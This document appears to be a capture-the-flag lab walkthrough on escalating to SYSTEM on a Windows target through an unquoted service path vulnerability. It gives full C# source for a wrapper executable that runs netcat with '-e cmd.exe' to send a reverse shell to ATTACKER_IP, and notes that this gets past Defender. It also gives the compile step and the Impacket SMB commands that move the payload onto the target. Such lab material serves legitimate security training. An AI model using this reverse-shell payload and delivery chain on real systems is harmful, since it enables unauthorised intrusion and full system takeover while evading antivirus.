Let's recap what we found in the previous task:

- We have a privilege which we could almost certainly use to escalate to system permissions. The downside is that we'd need to obfuscate the exploits in order to get them past Defender.
- We have an unquoted service path vulnerability for a service running as the system account. This is ideal.

We have everything we need to root this box. Let's do this!

Of the two vulnerabilities that are immediately available, we will work through the *unquoted service path attack* for one simple reason: getting a reverse shell back from this is _very_ easy -- even with Defender in play. 

The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._ To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. 

Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It's worth noting that this technique is effective at bypassing the antivirus software on the target; however, *in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system*. In this scenario we would be looking for a more sophisticated (if similar) solution.

Ideally we'd be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the `mono` dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.

---
## Install mono

First we need to install Mono. This can be done with:  

```
sudo apt update
sudo apt install mono-devel -y
```


If you are using the AttackBox then this should already be installed.  

## Create Wrapper.cs

Now, open a file called `Wrapper.cs` in your favorite text editor.

The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:  

```
using System;
using System.Diagnostics;  
```
 

These allow us to start new processes (i.e. execute netcat).

Next we need to initialise a namespace and class for the program:  

```
namespace Wrapper{       
	class Program{           
		static void Main(){
			//Our code will go here!
		}
	}
}
```

We can now write the code that will call netcat. This goes inside the `Main()` function (replacing the `//Our code will go here!` line).

First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:  

```
Process proc = new Process();   
ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
```

_Make sure to replace the_ `nc-USERNAME.exe` _with the name of your own netcat executable, as well as slotting in your own IP and Port!_

With the objects created, we can now configure the process to not create it's own GUI Window when starting:  
`procInfo.CreateNoWindow = true;`  

Finally, we attach the `ProcessStartInfo` object to the process, and start the process!  
`proc.StartInfo = procInfo;   proc.Start();`  

Our program is now complete. It should look something like this:

![[1680d2c86ef0.png]]

## Compile

We can now compile our program using the Mono `mcs` compiler. This is extremely simple using the package we installed earlier:

```
mcs Wrapper.cs
```

![[f051e39d81f6.png]]

Write and compile a wrapper program using Mono or Visual Studio.

## Transfer Wrapper.exe

Transfer the `Wrapper.exe`   file to the target. Just to spice things up a bit, let's use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.


---

## Impacket

Impacket is a Python library that makes it very easy to interact with a wide variety of Windows services from Linux.  

First up, let's download the package:  
`sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .   `

> [!Note]
>On the AttackBox Impacket is preinstalled at `/opt/impacket/impacket`

We can now start up a temporary SMB server:  
`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword`

![[99f9b77f1bf0.png]]

With this command we created a server on our IP, serving a share called "share" in the current directory. As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. We then set a username and password for connections to the server -- again, this is due to security policies on the target requiring connections to be authenticated.

Now, in our #Reverse_Shell , we can use this command to authenticate: 

`net use \\ATTACKER_IP\share /USER:user s3cureP@ssword`

![[9a27791867af.png]]

This authenticates with the server using the credentials we set (`user:s3cureP@ssword`). We can now copy our compiled  `Wrapper.exe` program up to the target. Due to file permissions on the normal `C:\Windows\Temp` directory, we are doing this from our current user's own `%TEMP%` directory:  

`copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe`

![[857c1d682e0e.png]]

> [!Note]
>We could have just executed this directly through the share -- exactly as we did with Mimikatz when dealing with the Gitserver. We are copying it here purely because we will need to have a copy on the target sooner or later anyway.

It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.

That said, to prevent errors down the line, we should disconnect from it for the time being: 

`net use \\ATTACKER_IP\share /del`

![[060e1ee4ce7c.png]]

